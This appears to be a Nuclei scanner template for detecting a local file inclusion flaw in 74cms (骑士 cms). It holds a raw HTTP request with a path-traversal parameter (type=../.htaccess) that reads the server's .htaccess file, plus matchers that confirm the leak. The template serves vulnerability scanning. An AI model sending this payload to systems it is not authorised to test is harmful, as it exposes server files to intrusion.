id: 74cms-index-lfi

info:
  name: 骑士 cms index - lfi
  author: Str1am    
  severity: medium
  reference: 
    - http://wooyun.org/bugs/wooyun-2014-086882
  tags: 74cms,lfi

http:
  - raw:
      - |
        GET /index.php?m=&c=M&a=index&type=../.htaccess HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "%{REQUEST_FILENAME} !-d"
        part: body
        condition: and

